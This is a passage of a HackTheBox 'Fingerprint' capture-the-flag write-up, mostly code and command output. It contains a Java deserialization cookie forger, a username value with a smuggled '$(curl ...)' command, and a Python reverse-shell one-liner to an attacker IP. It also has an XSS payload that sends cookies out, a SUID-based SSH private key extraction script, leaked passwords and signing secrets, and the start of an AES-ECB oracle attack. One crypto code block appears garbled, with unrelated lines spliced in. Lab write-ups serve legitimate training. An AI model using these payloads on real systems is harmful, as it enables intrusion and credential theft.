     <span class="built_in">return</span> username.equals(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void updateProfile(final Profile profile) throws IOException &#123;</span><br><span class="line">        final byte[] res = SerUtils.toByteArray(profile);</span><br><span class="line">        FileUtil.write(res, getProfileLocation());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>We can see where our session is going to be written, in our case it’d be in micheal1235.ser however we want a session in admin.ser. We can do this be unserializing our current cookie value, changing ourselves to admin then re-serializing. Below is a convenient script made by sakertooth (<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Nha2VydG9vdGg/dGFiPXJlcG9zaXRvcmllcw==">https://github.com/sakertooth?tab=repositories<i class="fa fa-external-link-alt"></i></span>):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">package com.admin.security.src.model;</span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">    Quick disclaimer that I didnt get to see all the code so I made some generalizations (maybe I didnt need it idk 🤷)</span><br><span class="line">    This may or may not work.</span><br><span class="line"></span><br><span class="line">    That being said, the way I understand it is that Serializable allows <span class="keyword">for</span> serialization and deserialization (obviously)</span><br><span class="line">    but only considers the fields when doing so. As such, the methods dont get serialized <span class="keyword">in</span> any way, but all the fields remain.</span><br><span class="line"></span><br><span class="line">    For more info: https://docs.oracle.com/javase/7/docs/api/java/io/Serializable.html</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">public class User implements Serializable &#123;</span><br><span class="line">    private static final long serialVersionUID = -7780857363453462165L;</span><br><span class="line"></span><br><span class="line">    private int <span class="built_in">id</span>;</span><br><span class="line">    private String username;</span><br><span class="line">    private String password;</span><br><span class="line">    private String fingerprint;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="title">User</span></span>() &#123;</span><br><span class="line">        <span class="built_in">id</span> = 0;</span><br><span class="line">        username = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        password = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        fingerprint = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    int <span class="function"><span class="title">getId</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="built_in">id</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String <span class="function"><span class="title">getUsername</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String <span class="function"><span class="title">getPassword</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String <span class="function"><span class="title">getFingerprint</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> fingerprint;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void setId(int <span class="built_in">id</span>) &#123;</span><br><span class="line">        this.id = <span class="built_in">id</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void setUsername(String username) &#123;</span><br><span class="line">        this.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void setPassword(String password) &#123;</span><br><span class="line">        this.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void setFingerPrint(String fingerprint) &#123;</span><br><span class="line">        this.fingerprint = fingerprint;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">    The program takes <span class="keyword">in</span> a file containing your serialized user (<span class="built_in">base64</span>).</span><br><span class="line">    It <span class="keyword">then</span> deserializes it, changes the username to admin,</span><br><span class="line">    serializes it back, and prints it to the console as <span class="built_in">base64</span>.</span><br><span class="line">*/</span><br><span class="line">class Program &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (args.length &lt; 1) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;usage: ./program &lt;base64 serialized user&gt;&quot;</span>);</span><br><span class="line">            <span class="built_in">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            byte[] serializedUserBytes = Base64.getDecoder().decode(args[0]);</span><br><span class="line">            ByteArrayInputStream serializedUserInputStream = new ByteArrayInputStream(serializedUserBytes);</span><br><span class="line"></span><br><span class="line">            ObjectInputStream objectInputStream = new ObjectInputStream(serializedUserInputStream);</span><br><span class="line">            User user = (User)objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;User successfully deserialized:&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;ID: &quot;</span> + user.getId());</span><br><span class="line">            System.out.println(<span class="string">&quot;Username: &quot;</span> + user.getUsername());</span><br><span class="line">            System.out.println(<span class="string">&quot;Password: &quot;</span> + user.getPassword());</span><br><span class="line">            System.out.println(<span class="string">&quot;Fingerprint: &quot;</span> + user.getFingerprint());</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;Changing username to &#x27;admin&#x27; and serializing back...&quot;</span>);</span><br><span class="line">            user.setUsername(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line"></span><br><span class="line">            ByteArrayOutputStream serializedUserOutputStream = new ByteArrayOutputStream();</span><br><span class="line">            ObjectOutputStream objectOutputStream = new ObjectOutputStream(serializedUserOutputStream);</span><br><span class="line">            objectOutputStream.writeObject(user);</span><br><span class="line"></span><br><span class="line">            String serializedAdminUserBase64 = Base64.getEncoder().encodeToString(serializedUserOutputStream.toByteArray());</span><br><span class="line">            System.out.println(<span class="string">&quot;Serialization of original user but with the name to &#x27;admin&#x27;: &quot;</span> + serializedAdminUserBase64);</span><br><span class="line">        &#125;</span><br><span class="line">        catch (IOException | ClassNotFoundException ex) &#123;</span><br><span class="line">            System.out.println(ex.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The output of which is:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">User successfully deserialized:</span><br><span class="line">ID: 2</span><br><span class="line">Username: micheal1235</span><br><span class="line">Password: LWg7gUR1EmX7UNxsJxqZ</span><br><span class="line">Fingerprint: 7ef52c251f8044cb187013992891d0e58ce9194de7f535b1b4fa6bbfe08678f6</span><br><span class="line">Changing username to <span class="string">&#x27;admin&#x27;</span> and serializing back...</span><br><span class="line">Serialization of original user but with the name to <span class="string">&#x27;admin&#x27;</span>: rO0ABXNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgABTAAIdXNlcm5hbWVxAH4AAXhwAAAAAnQAQDdlZjUyYzI1MWY4MDQ0Y2IxODcwMTM5OTI4OTFkMGU1OGNlOTE5NGRlN2Y1MzViMWI0ZmE2YmJmZTA4Njc4ZjZ0ABRMV2c3Z1VSMUVtWDdVTnhzSnhxWnQABWFkbWlu</span><br></pre></td></tr></table></figure>

<p>We can resign our cookie using the secret from earlier: SjG$g5VZ(vHC;M2Xc&#x2F;2~z(. After doing so, we have access to “recent logs”:</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2142.jpg"></p>
</li>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2143.jpg"></p>
</li>
</ul>
<h1 id="User-own"><a href="#User-own" class="headerlink" title="User own"></a>User own</h1><p>Finally, we’re getting somewhere. The actual log feature isn’t useful as we already have access and know it’s vulnerable to XSS. Instead, we can continue with the serialization idea and attempt to get a reverse shell. We’ll save our admin cookie for now just in case:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoick8wQUJYTnlBQ0ZqYjIwdVlXUnRhVzR1YzJWamRYSnBkSGt1YzNKakxtMXZaR1ZzTGxWelpYS1VCTmR6NDErNWF3SUFCRWtBQW1sa1RBQUxabWx1WjJWeWNISnBiblIwQUJKTWFtRjJZUzlzWVc1bkwxTjBjbWx1Wnp0TUFBaHdZWE56ZDI5eVpIRUFmZ0FCVEFBSWRYTmxjbTVoYldWeEFINEFBWGh3QUFBQUFuUUFRRGRsWmpVeVl6STFNV1k0TURRMFkySXhPRGN3TVRNNU9USTRPVEZrTUdVMU9HTmxPVEU1TkdSbE4yWTFNelZpTVdJMFptRTJZbUptWlRBNE5qYzRaalowQUJSTVYyYzNaMVZTTVVWdFdEZFZUbmh6U25oeFduUUFCV0ZrYldsdSJ9.lPDqZy7OX9cBclkxmK9gAx4SWiad_YFrjezvJO1apCA</span><br></pre></td></tr></table></figure>

<p>We can repurpose the script (now knowing it works) to overwrite the username and perform RCE:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import com.admin.security.src.model.User;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class edit &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">        User user = new User();</span><br><span class="line"></span><br><span class="line">        //user.username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        //user.id = 0;</span><br><span class="line">        //user.fingerprint = <span class="string">&quot;/data/sessions/admin.ser&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        /*</span><br><span class="line">            FileOutputStream fileOut = new FileOutputStream(<span class="string">&quot;/tmp/userAdmin2.ser&quot;</span>);</span><br><span class="line">            ObjectOutputStream out = new ObjectOutputStream(fileOut);</span><br><span class="line">            out.writeObject(user);</span><br><span class="line">         */</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">        user.username = <span class="string">&quot;../sessions/a<span class="subst">$(curl http://10.10.14.25/)</span>/../../../admin&quot;</span>;</span><br><span class="line">        user.id = 0;</span><br><span class="line">        user.fingerprint = <span class="string">&quot;/data/sessions/admin.ser&quot;</span>;</span><br><span class="line">        user.password = <span class="string">&quot;test&quot;</span>;</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(user);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        String cookie = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line"></span><br><span class="line">        System.out.println(cookie);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>We can generate a reverse shell and update the script to use this:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.25&quot;,4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p>We should then get a reverse shell. We see there’s a SUID binary available to us. Our goal here is to retrieve a id_rsa key for SSH using it, below is Yuma’s script for it (<span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vWXVtYS1Uc3VzaGltYTA3">https://gist.github.com/Yuma-Tsushima07<i class="fa fa-external-link-alt"></i></span>):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import os, sys </span><br><span class="line">sys.setrecursionlimit(10000)</span><br><span class="line"></span><br><span class="line">letters = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;F&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;I&quot;</span>, <span class="string">&quot;J&quot;</span>, <span class="string">&quot;K&quot;</span>, <span class="string">&quot;L&quot;</span>, <span class="string">&quot;M&quot;</span>, <span class="string">&quot;N&quot;</span>, <span class="string">&quot;O&quot;</span>, <span class="string">&quot;P&quot;</span>, <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;R&quot;</span>, <span class="string">&quot;S&quot;</span>, <span class="string">&quot;T&quot;</span>, <span class="string">&quot;U&quot;</span>, <span class="string">&quot;V&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">&quot;X&quot;</span>, <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;Z&quot;</span>, <span class="string">&#x27;=&#x27;</span>,  <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;\+&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">startpoint = <span class="string">&quot;-----BEGIN OPENSSH PRIVATE KEY-----&quot;</span></span><br><span class="line">valid = <span class="string">&quot; &quot;</span></span><br><span class="line"></span><br><span class="line">def getKey(str_bt):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> letters:</span><br><span class="line">        p = str_bt + i</span><br><span class="line">        out = os.popen(f<span class="string">&#x27;./cmatch example &quot;&#123;p&#125;&quot;&#x27;</span>).<span class="built_in">read</span>()</span><br><span class="line">        a = out.replace(<span class="string">&quot;Found&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        b = a.replace(<span class="string">&quot;Matches&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        count = b.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(int(count) == 1):</span><br><span class="line">            str_bt = str_bt+ i</span><br><span class="line">            <span class="built_in">print</span>(str_bt)</span><br><span class="line">            getKey(str_bt)</span><br><span class="line"></span><br><span class="line">getKey(startpoint)</span><br></pre></td></tr></table></figure>

<p>We do get a use-able key (with the name John), however we still need a password. Doing some source code analysis leads us to the existing java classes. One of which has a hibernate password commented out:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//   69: ldc <span class="string">&#x27;hibernate.connection.username&#x27;</span></span><br><span class="line">//   71: bipush <span class="comment">#-13</span></span><br><span class="line">//   73: pop</span><br><span class="line">//   74: ldc <span class="string">&#x27;htb&#x27;</span></span><br><span class="line">//   76: &lt;illegal opcode&gt; llIIIIIlIIIlIlIllllI : (Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;</span><br><span class="line">//   81: bipush <span class="comment">#-14</span></span><br><span class="line">//   83: pop</span><br><span class="line">//   84: pop</span><br><span class="line">//   85: aload_1</span><br><span class="line">//   86: ldc <span class="string">&#x27;hibernate.connection.password&#x27;</span></span><br><span class="line">//   88: bipush <span class="comment">#42</span></span><br><span class="line">//   90: pop</span><br><span class="line">//   91: ldc <span class="string">&#x27;q9Patz64fhtiVSO6Df2K&#x27;</span></span><br><span class="line">//   93: &lt;illegal opcode&gt; IllllllllllllllllIll : (Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;</span><br><span class="line">//   98: pop</span><br><span class="line">//   99: nop</span><br><span class="line">//   100: aload_</span><br></pre></td></tr></table></figure>

<p>Using this, we can get a shell.</p>
<h1 id="Root-own"><a href="#Root-own" class="headerlink" title="Root own"></a>Root own</h1><p>We have a few backups, the one one was have access to is flask-app-secure.bak, we can copy this over to our local machine and enumerate it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -i id_rsa john@fingerprint.htb:/var/backups/flask-app-secure.bak ./</span><br></pre></td></tr></table></figure>

<p>We can look at the improvement notes and see that this is likely going to be crypto:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[x] fixed access control flaw</span><br><span class="line">[x] introduced authorization</span><br><span class="line">[x] safe authentication with custom crypto</span><br></pre></td></tr></table></figure>

<p>There is a custom encryption in place that we need to try crack. There is a service running on port 8080 which is likely this flask app, we can forward this to ourselves too:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 8080:localhost:8080 -i id_rsa john@fingerprint.htb</span><br></pre></td></tr></table></figure>

<p>Look familiar? It’s the same app before just using a different authentication method. We can re-use the XSS from before and see if we can get the box to connect back to us.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location%3d<span class="string">&quot;http%3a//10.10.14.25%3a81/&quot;</span>%2bdocument.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>We get the following:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/Fingerprint]</span><br><span class="line">└─<span class="comment"># python2 -m SimpleHTTPServer 81                                                                                              1 ⨯</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 81 ...</span><br><span class="line">10.10.11.127 - - [03/Feb/2022 11:01:05] code 404, message File not found</span><br><span class="line">10.10.11.127 - - [03/Feb/2022 11:01:05] <span class="string">&quot;GET /user_id=49f5f0062780bed62dc06bf4a8d2dd9cb5c3fda50e19a5a840262c26c001bb0338550635d9fd36fef81113d9fbd15805193308e099ee214406b0a87c0b6587fb HTTP/1.1&quot;</span> 404 -</span><br></pre></td></tr></table></figure>

<p>This does appear to be static so we don’t have much to worry about. It appears to be using AES-ECB:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2144.jpg"></li>
</ul>
<p>Here are the functions for this:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">SECRET = <span class="string">&quot;password&quot;</span></span><br><span class="line">KEY = <span class="string">&quot;mykey&quot;</span></span><br><span class="line">cryptor = AES.new(KEY, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">def decrypt(data):</span><br><span class="line">    result = cryptor.decrypt(data.decode(<span class="string">&quot;hex&quot;</span>))</span><br><span class="line">    pad_len = ord(result[-1])</span><br><span class="line">    <span class="built_in">return</span> result[:-pad_len]</span><br><span class="line"></span><br><span class="line">def encrypt(data):</span><br><span class="line">    <span class="comment"># do some padding</span></span><br><span class="line">    block_size = 16</span><br><span class="line">    pad_size = block_size - len(data) % block_size</span><br><span class="line">    padding = chr(pad_size) * pad_sizestart_block_gap = 64</span><br><span class="line">known = <span class="string">&quot;,7h15_15_4_v3ry_57r0n6_4nd_uncr4ck4bl3_p455phr453!!!,true&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;user_id&quot;</span>:<span class="string">&quot;49f5f0062780bed62dc06bf4a8d2dd9cb5c3fda50e19a5a840262c26c001bb0338550635d9fd36fef81113d9fbd15805193308e099ee214406b0a87c0b6587fb&quot;</span>&#125;</span><br><span class="line">session = requests.session()</span><br><span class="line">    data += padding</span><br><span class="line">    <span class="built_in">return</span> cryptor.encrypt(data).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>We can forward localhost:8088 to ourselves from the target box and see if we can attack this:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 8088:localhost:8088 -i id_rsa john@fingerprint.htb</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from string import printable</span><br><span class="line"></span><br><span class="line">def getBlocks(userid):</span><br><span class="line">    new=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(0, len(userid),blockSize):</span><br><span class="line">        new.append(userid[i:i+blockSize])</span><br><span class="line">    <span class="built_in">return</span> new</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">def determine_blockSize():</span></span><br><span class="line"><span class="string">    newUIDLen = 0</span></span><br><span class="line"><span class="string">    username_len = 1</span></span><br><span class="line"><span class="string">    while UIDLen &gt;= newUIDLen:</span></span><br><span class="line"><span class="string">        request = session.post(&quot;</span>http://localhost:8088/profile<span class="string">&quot;, data=&#123;&quot;</span>new_name<span class="string">&quot;:&quot;</span>\x01<span class="string">&quot;*username_len&#125;, cookies=cookies, allow_redirects=False)</span></span><br><span class="line"><span class="string">        userid = request.cookies[&#x27;user_id&#x27;]</span></span><br><span class="line"><span class="string">        newUIDLen = len(userid)</span></span><br><span class="line"><span class="string">        print(username_len)</span></span><br><span class="line"><span class="string">        print(&quot;</span>username = <span class="string">&quot;+&quot;</span>a<span class="string">&quot;*username_len+&quot;</span> yield length = <span class="string">&quot;+str(newUIDLen))</span></span><br><span class="line"><span class="string">        username_len+=1</span></span><br><span class="line"><span class="string">        print(&quot;</span>\n<span class="string">&quot;.join(getBlocks(userid)))</span></span><br><span class="line"><span class="string">        print(&quot;</span>-<span class="string">&quot;*32)</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    known = <span class="string">&#x27;,7h15_15_4_v3ry_57r0n6_4nd_uncr4ck4bl3_p455phr4&#x27;</span></span><br><span class="line">    <span 